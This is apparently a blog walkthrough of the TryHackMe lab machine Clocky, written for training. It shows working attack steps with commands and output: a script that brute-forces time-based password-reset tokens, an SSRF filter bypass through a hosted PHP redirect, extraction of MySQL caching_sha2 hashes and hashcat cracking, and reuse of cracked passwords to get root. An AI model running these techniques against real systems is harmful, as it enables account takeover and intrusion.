---
title: CTF Walkthrough for TryHackMe Machine Clocky
date: 2024-10-20 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [TryHackMe, Writeup, SSRF]   
image:
  path: /assets/img/posts/walthrough/tryhackme/2024-10-20-clocky/box-clocky.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Clocky a TryHackMe machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: Clocky<br>
Difficulty: Medium<br>
Operating System: Linux<br>
Machine link: [Clocky](https://tryhackme.com/r/room/clocky)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>
3) Hashcat<br>

## Reconnaissance

We will start by performing a service scan on the target to enumerate the services running on open ports.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Clocky/Scans/Service]
└─$ nmap -sC -sV -n 10.10.46.31  -oN service-scan.nmap                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 08:43 BST                            
Stats: 0:01:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan                                                                                                                  
Service scan Timing: About 75.00% done; ETC: 08:45 (0:00:22 remaining)                        
Stats: 0:02:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                    
NSE Timing: About 99.47% done; ETC: 08:46 (0:00:00 remaining)                                 
Nmap scan report for 10.10.159.34                                                             
Host is up (0.37s latency).                                                                   
                                               
PORT     STATE SERVICE    VERSION                                                             
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)        
| ssh-hostkey:                                                                                
|   3072 d9:42:e0:c0:d0:a9:8a:c3:82:65:ab:1e:5c:9c:0d:ef (RSA)
|   256 ff:b6:27:d5:8f:80:2a:87:67:25:ef:93:a0:6b:5b:59 (ECDSA)         
|_  256 e1:2f:4a:f5:6d:f1:c4:bc:89:78:29:72:0c:ec:32:d2 (ED25519)
80/tcp   open  http       Apache httpd 2.4.41                                                 
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden  
8000/tcp open  http       nginx 1.18.0 (Ubuntu) 
| http-robots.txt: 3 disallowed entries                                                       
|_/*.sql$ /*.zip$ /*.bak$                                                                                                                                                                    
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                   
|_http-title: 403 Forbidden
8080/tcp open  http-proxy Werkzeug/2.2.3 Python/3.8.10
|_http-server-header: Werkzeug/2.2.3 Python/3.8.10     
| fingerprint-strings:                        
|   FourOhFourRequest:                   
|     HTTP/1.1 404 NOT FOUND                
|     Server: Werkzeug/2.2.3 Python/3.8.10                                                    
|     Date: Fri, 18 Oct 2024 07:44:09 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close           
|     <!doctype html>       
|     <html lang=en>                                                                                                                                                                         
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>                                                                                                                                                                     
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:                          
|     HTTP/1.1 200 OK                                                                                                                                                                        
|     Server: Werkzeug/2.2.3 Python/3.8.10  
<SNIP>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 170.25 seconds 
```

## First Flag
We ca see that the target runs an SSH server and three web servers on ports 80, 8000, and 8080. The scan result reveals the presence of a `robots.txt` file on the web application running on port 8000. We can access this file directly to read its content.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Clocky/Scans/Web]
└─$ curl 10.10.46.31:8000/robots.txt                                                                                          
User-agent: *
Disallow: /*.sql$
Disallow: /*.zip$
Disallow: /*.bak$

Flag 1: <REDACTED>
```

## Second Flag

This file contains the first flag of the room and also prevents web scrawler from accessing files with the extensions `.sql`, `.zip`, and `.bak`. This may indicate that some files in on this server carry this extension. We can use `ffuf` to fuzz for files with these extensions.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Clocky]
└─$ ffuf -ic -c -u 'http://10.10.46.31:8000/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .zip,.sql,.bak
<SNIP>
________________________________________________

                        [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 156ms]
index.zip               [Status: 200, Size: 1922, Words: 6, Lines: 11, Duration: 189ms]
                        [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 152ms]
<SNIP>
```

We can see that the file `index.zip` is present on the server. We can download this file and examine its content.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Clocky/Misc File]
└─$ curl http://10.10.46.31:8000/index.zip -o index.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1922  100  1922    0     0   7095      0 --:--:-- --:--:-- --:--:--  7118

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Clocky/Misc File]
└─$ ls
index.zip

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Clocky/Misc File]
└─$ unzip index.zip                    
Archive:  index.zip
  inflating: app.py                  
 extracting: flag2.txt 
```

## Third Flag

This file contains the second flag of the room and an `app.py` file. Remember that a Python server is running on port 8080 of the target. This might be the source code of the Python web application running so let's examine it. 
```python
# Not done with correct imports
# Some missing, some needs to be added
# Some are not in use...? Check flask imports please. Many are not needed
from flask import Flask, flash, redirect, render_template, request, session, abort, Response
from time import gmtime, strftime
from dotenv import load_dotenv
import os, pymysql.cursors, datetime, base64, requests


# Execute "database.sql" before using this
load_dotenv()
<SNIP>
app = Flask(__name__)


# A new app will be deployed in prod soon
# Implement rate limiting on all endpoints
# Let's just use a WAF...?
# Not done (16/05-2023, jane)
@app.route("/")
def home():
	current_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
	return render_template("index.html", current_time=current_time)



# Done (16/05-2023, jane)
@app.route("/administrator", methods=["GET", "POST"])
def administrator():
	if session.get("logged_in"):
		return render_template("admin.html")
<SNIP>

# Work in progress (10/05-2023, jane)
# Is the db really necessary?
@app.route("/forgot_password", methods=["GET", "POST"])
def forgot_password():
	if session.get("logged_in"):
		return render_template("admin.html")
<SNIP>


# Done
@app.route("/password_reset", methods=["GET"])
def password_reset():
        if request.method == "GET":
                # Need to agree on the actual parameter here (12/05-2023, jane)
                if request.args.get("TEMPORARY"):
                        # Not done (11/05-2023, clarice)
<SNIP>

# Use gunicorn?
if __name__ == "__main__":
	app.secret_key = os.urandom(256)
	app.run(host="0.0.0.0", port="8080", debug=True)
```

We can notice some usernames in the comments i.e. jane and clarice. Also, we can notice in comments the line `# Execute "database.sql" before using this`. This might surely be a file on one of the web servers but currently, it is not accessible from any of them. One interesting endpoint is the `/password_reset`.
```python
@app.route("/password_reset", methods=["GET"])
def password_reset():
        if request.method == "GET":
                # Need to agree on the actual parameter here (12/05-2023, jane)
                if request.args.get("TEMPORARY"):
                        # Not done (11/05-2023, clarice)
                        # user_provided_token = request.args.get("TEMPORARY")

                        try:
                                with connection.cursor() as cursor:

                                        sql = "SELECT token FROM reset_token WHERE token = %s"
                                        cursor.execute(sql, (user_provided_token))
                                        if cursor.fetchone():
                                                return render_template("password_reset.html", token=user_provided_token)

                                        else:
                                                return "<h2>Invalid token</h2>"

                        except:
                                pass

                else:
                        return "<h2>Invalid parameter</h2>"
        return "<h2>Invalid parameter</h2>"
```

From the code snippet above we see that a reset password token is created and stored in the database using the time the password change request was sent and the username of the user requesting the password change. This can be exploited easily because if we have a valid username, we can use the time returned by the server, precise till the nearest second to brute force the number of milliseconds. We can request the username of a well-known user present in most applications i.e. the administrator.
![](/assets/img/posts/walthrough/tryhackme/2024-10-20-clocky/reset-pass-1.png)
![](/assets/img/posts/walthrough/tryhackme/2024-10-20-clocky/reset-pass-2.png)

The picture above shows the time return by the server in the response header. We can use this time to generate tokens in the same way it is generated in the `app.py` file. We can do this using the custom Python script below.
```python
#!/usr/bin/python3

import hashlib



server_date = '2024-10-18 14:28:52'
tokens=[]
for i in range(0,1000):
    token = f'{server_date}.{i} . ADMINISTRATOR'
    tokens.append(hashlib.sha1(token.encode("utf-8")).hexdigest()) 


with open('tokens.txt', 'w') as f:
    for token in tokens:
        f.write(f'{token}\n')
```
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Clocky/Misc File]
└─$ ./token_generator.py

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Clocky/Misc File]
└─$ tail tokens.txt 
4a3bf5daff3f61039245e99423d5cc150cb642a1
<SNIP>
6483a3e29c113b4f366b3bdcfe54aeb95b5f3994
```

Now that we have a list of possible valid tokens, we can fuzz the `/password_reset` endpoint. We will notice that if we test this endpoint with the parameter we saw in the `app.py` file it returns the error message `Invalid Parameter`. 
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Clocky]
└─$ curl http://10.10.46.31:8080/password_reset?TEMPORARY=test
 
<h2>Invalid parameter</h2>  
```

We can fuzz for valid parameters using the `burp-parameter-names.txt` wordlist.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Clocky]
└─$ ffuf -ic -c -u  'http://10.10.46.31:8080/password_reset?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 26

<SNIP>

token                   [Status: 200, Size: 22, Words: 2, Lines: 1, Duration: 133ms]
:: Progress: [6453/6453] :: Job [1/1] :: 156 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
```

We have discovered a valid parameter. Now we can fuzz the web application with the token list we generated above.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Clocky/Misc File]
└─$ ffuf -ic -c -u  'http://10.10.46.31:8080/password_reset?token=FUZZ' -w ./tokens.txt  -fs 22                       

<SNIP>
________________________________________________

4634f088af86a10621b36a207c8b421bfc1d64cf [Status: 200, Size: 1627, Words: 665, Lines: 54, Duration: 126ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Once we find a valid token we can stop ffuf. We can now access the web page on our browser and reset the administrator password.
![](/assets/img/posts/walthrough/tryhackme/2024-10-20-clocky/password-change.png)

Once we change the password of the administrator, we can log into the app and read the third flag on the home page.
![](/assets/img/posts/walthrough/tryhackme/2024-10-20-clocky/third-flag.png)

## Fourth Flag

The admin panel has an input field named location. When we enter a random word and click on the download button, an empty file named `file.txt` is downloaded. We can guess that the server fetches this file from the location we entered. Let's test if the parameter is vulnerable to SSRF. For this, we can start a listener on our attack host and send our IP address as the location. 
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Clocky]
└─$ nc -lvnp 80             
listening on [any] 80 ...
```

```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Clocky/Misc File]
└─$ curl http://10.10.46.31:8080/dashboard -H "Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.ZxJ22g.93hnFnlxzd2drMkpiGKXKR83_08" -X POST -d 'location=http://10.21.68.180'   
```

```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Clocky]
└─$ nc -lvnp 80             
listening on [any] 80 ...
connect to [10.21.68.180] from (UNKNOWN) [10.10.46.31] 60706
GET / HTTP/1.1
Host: 10.21.68.180
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

We see that the target accessed our listener. Unfortunately, when we try to access the local IP address of the server we get the error message `Action not permitted`. This might be due to some filters put in place on the server side.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Clocky/Misc File]
└─$ curl http://10.10.46.31:8080/dashboard -H "Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.ZxJ22g.93hnFnlxzd2drMkpiGKXKR83_08" -X POST -d 'location=http://127.0.0.1:8000/index.zip'  
<SNIP>
    <body>    
            <center> <h2>Administrator dashboard<br><br>Flag 3: THM{ee68e42f755f6ebbcd89439432d7b462}</h2>   
        <form action="/dashboard" method="POST">
            <div class="container">
                <input type="text" placeholder="Location" name="location" required><br>  
                <button type="submit">Download</button><br>
                Action not permitted<br>
            </div>   
        </form> 
        </center>    
    </body>     
    </html> 
```

We can bypass this filter by providing a URL that we control (10.10.46.31), which redirects to the target URL. To do this we can create a PHP file that when accessed redirects to the localhost IP address. Since we were denied access when we tried to access the web application running on port 80, let's try to access it locally by redirecting the target to `http://127.0.0.1/`
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Clocky/Misc File/php_server]
└─$ cat index.php     
<?php
 
// Redirect browser
$file=$_GET["filename"];
header("Location: http://127.0.0.1/" . $file);
 
exit;
?>

┌──(pentester㉿kali)-[~/…/Challenge/Clocky/Misc File/php_server]
└─$ php -S 0.0.0.0:8000
[Fri Oct 18 16:50:03 2024] PHP 8.2.21 Development Server (http://0.0.0.0:8000) started
```

After hosting this file in a simple PHP server, we can access it from the target. We can attempt to access a common page in a web application's root directory i.e. `index.html`
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Clocky/Misc File]
└─$ curl http://10.10.46.31:8080/dashboard -H "Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.ZxJ22g.93hnFnlxzd2drMkpiGKXKR83_08" -X POST -d 'location=http://10.21.68.180:8000/index.php?filename=index.html' 
<h2>Internal dev storage</h2>
```

We see that an output is returned. This web application appears to be an internal development storage. Remember that we enumerated a file named `database.sql` in the comments of the `app.py` file. Since we couldn't access it from the public IP address, we can try to accessing it locally. 
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Clocky/Misc File]
└─$ curl http://10.10.46.31:8080/dashboard -H "Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.ZxJ22g.93hnFnlxzd2drMkpiGKXKR83_08" -X POST -d 'location=http://10.21.68.180:8000/index.php?filename=database.sql' 

#################################################
#                                               #
# Flag 4: <REDACTED> #
#                                               #
#################################################

CREATE DATABASE IF NOT EXISTS clocky;
USE clocky;

CREATE USER IF NOT EXISTS 'clocky_user'@'localhost' IDENTIFIED BY '!WE_LOVE_CLEARTEXT_DB_PASSWORDS!';
GRANT ALL PRIVILEGES ON *.* TO 'clocky_user'@'localhost' WITH GRANT OPTION;

CREATE USER IF NOT EXISTS 'clocky_user'@'%' IDENTIFIED BY '<REDACTED>';
GRANT ALL PRIVILEGES ON *.* TO 'clocky_user'@'%' WITH GRANT OPTION;
<SNIP>

INSERT INTO users (username) VALUES ("administrator");

CREATE TABLE passwords(
        ID INT AUTO_INCREMENT NOT NULL,
        password VARCHAR(256) NOT NULL,
        FOREIGN KEY (ID) REFERENCES users(ID) );

INSERT INTO passwords (password) VALUES ("<REDACTED>");

/* Do we actually need this part anymore?
<SNIP>

### TEST TOKEN ###
INSERT INTO reset_token (username, token) VALUES ("administrator", "WyJhZG1pbmlzdHJhdG9yIl0.hFrZoI0BzkqoI01vfOL13haqpwY");
*/
```

## Fifth Flag

This database file indeed existed on the target and we can see the fourth flag and two passwords. When we try these passwords with the usernames we saw above, we will get a hit on the user clarice.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Clocky/Misc File]
└─$ ssh clarice@10.10.46.31 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-165-generic x86_64)
<SNIP>
clarice@clocky:~$ ls
app  flag5.txt  snap
```

## Sixth Flag

The `app.py` file we discovered earlier contained the following code snippet.
```bash
load_dotenv()
db = os.environ.get('db')


# Connect to MySQL database
connection = pymysql.connect(host="localhost",
								user="clocky_user",
								password=db,
								db="clocky",
								cursorclass=pymysql.cursors.DictCursor)

app = Flask(__name__)
```

This use the os module to get the environment variable `db` and uses it as the password for the user clocky_user to connect to the MySQL database running locally on the target. This variable are store in the `.env` file of the web application root directory. We read it to obtain the password used to access the database server.
```bash
clarice@clocky:~$ cat app/.env 
db=<REDACTED>
```

We can use this password to connect to the database and enumerate it.
```bash
clarice@clocky:~$ mysql -u clocky_user -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 19
Server version: 8.0.34-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

We can start our enumeration by enumerating users who can access the database server. If more than one is present, we can read their password hash and attempt an offline brute force attack.
```mysql
mysql> SELECT user FROM mysql.user;
+------------------+
| user             |
+------------------+
| clocky_user      |
| dev              |
| clocky_user      |
| debian-sys-maint |
| dev              |
| mysql.infoschema |
| mysql.session    |
| mysql.sys        |
| root             |
+------------------+
9 rows in set (0.00 sec)
```

We can see that more that one user can connect to the database server. If we enumerate the columns available in the mysql.user table, we will notice that the MySQL plugin `caching_sha2_password` is activated. 
```mysql
mysql> DESCRIBE user;
+--------------------------+-----------------------------------+------+-----+-----------------------+-------+
| Field                    | Type                              | Null | Key | Default               | Extra |
+--------------------------+-----------------------------------+------+-----+-----------------------+-------+
| Host                     | char(255)                         | NO   | PRI |                       |       |
| User                     | char(32)                          | NO   | PRI |                       |       |
| Select_priv              | enum('N','Y')                     | NO   |     | N                     |       |
| Insert_priv              | enum('N','Y')                     | NO   |     | N                     |       |
| Update_priv              | enum('N','Y')                     | NO   |     | N                     |       |
| Delete_priv              | enum('N','Y')                     | NO   |     | N                     |       |
| Create_priv              | enum('N','Y')                     | NO   |     | N                     |       |
| Drop_priv                | enum('N','Y')                     | NO   |     | N                     |       |
| Reload_priv              | enum('N','Y')                     | NO   |     | N                     |       |
<SNIP>
| max_user_connections     | int unsigned                      | NO   |     | 0                     |       |
| plugin                   | char(64)                          | NO   |     | caching_sha2_password |       |
| authentication_string    | text                              | YES  |     | NULL                  |       |
| password_expired         | enum('N','Y')                     | NO   |     | N                     |       |
<SNIP>
+--------------------------+-----------------------------------+------+-----+-----------------------+-------+  
```

Let's Google this plugin to understand what it does.
![](/assets/img/posts/walthrough/tryhackme/2024-10-20-clocky/plugin-describtion.png)

We can read that this plugin is used by MySQL for authentication. We can also see a column named `authentication_string` above. When we access it we get the result below.
```bash
mysql> SELECT authentication_string  FROM mysql.user;
+------------------------------------------------------------------------+
| authentication_string                                                  |
+------------------------------------------------------------------------+
| $A$005$~|\>B^:
                yCR0kSV+XwNDxm2lDD5W3J9551gjlVmOZ9Z9hH2Szailxm2VkL. |
| $A$005$Ebh3N5a#f6HM?xF*uSqjNbbUYGitDq/yFLM8LbauDh83QtraQaETy6nZWtWc2 |
| $A$005$
8w|Q!N]rZX!mZ\?ok/WxQEdeRLNgqXpWEf4sJonZecawFUizD8FokeI5F. |
| $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
| $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
| $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
|                                                                        |
+------------------------------------------------------------------------+
9 rows in set (0.00 sec)
```

After several researches, I found this [issue](https://github.com/hashcat/hashcat/issues/3049) on GitHub that gives the SQL query used to extract this hashes into Hashcat format. 
```bash
mysql> SELECT user, CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM user WHERE plugin = 'caching_sha2_password' AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';
+------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
| user             | hash                                                                                                                                         |
+------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
| clocky_user      | $mysql$A$005*077E1B6B675D350F435D5D1C686D12566C08635A*5566386F49543936423756525A68516962735568536535654B62486D344C71316B7338707A78446B4E4D39 |
| dev              | <REDACTED>                                                                                                                                   |
| clocky_user      | $mysql$A$005*63671A7C5C3E425E3A0C794352306B531456162B*58774E44786D326C44443557334A39353531676A6C566D4F5A395A39684832537A61696C786D32566B4C2E |
| debian-sys-maint | $mysql$A$005*456268331A4E3561236636480E4D3F78462A7553*716A4E6262555947697444712F79464C4D384C62617544683833517472615161455479366E5A5774576332 |
| dev              | <REDACTED>                                                                                                                                   |
+------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
5 rows in set (0.00 sec)
```

Since we already know the password of the custom user clocky_user, Let's copy that of dev and attempt an offline brute force attack.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Clocky/Misc File]
└─$ cat hashes 
$mysql$A$005*0D172F787569054E322523067049563540383D17*XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
$mysql$A$005*1C160A38777C5121134E5D725A58216D5A1D5C3F*XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Clocky/Misc File]
└─$ hashcat -m 7401 -a 0 hashes /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting
<SNIP>
$mysql$A$005*1C160A38777C5121134E5D725A58216D5A1D5C3F*XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:<REDACTED>
$mysql$A$005*0D172F787569054E322523067049563540383D17*XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:<REDACTED>
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7401 (MySQL $A$ (sha256crypt))
Hash.Target......: hashes
Time.Started.....: Fri Oct 18 20:11:02 2024 (59 secs)
Time.Estimated...: Fri Oct 18 20:12:01 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (.rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1710 H/s (7.44ms) @ Accel:32 Loops:256 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
Progress.........: 100352/28688770 (0.35%)
Rejected.........: 0/100352 (0.00%)
Restore.Point....: 49920/14344385 (0.35%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:4864-5000
Candidate.Engine.: Device Generator
Candidates.#1....: bobocel -> 151182
Hardware.Mon.#1..: Temp: 76c Util: 93%

Started: Fri Oct 18 20:10:41 2024
Stopped: Fri Oct 18 20:12:03 2024
```

The name dev indicates that this account is used in the development process. Developers often have access to important components of a system so let's try this password to log in as the root user.
```bash
clarice@clocky:~$ su root 
Password: 
root@clocky:/home/clarice# ls ~/
flag6.txt  snap
```

We can log in as the root user and we can access the sixth flag.

## Conclusion

Congratulations! This machine was designed to sharpen your enumeration and code analyses skills. Thanks for following up on this walkthrough.
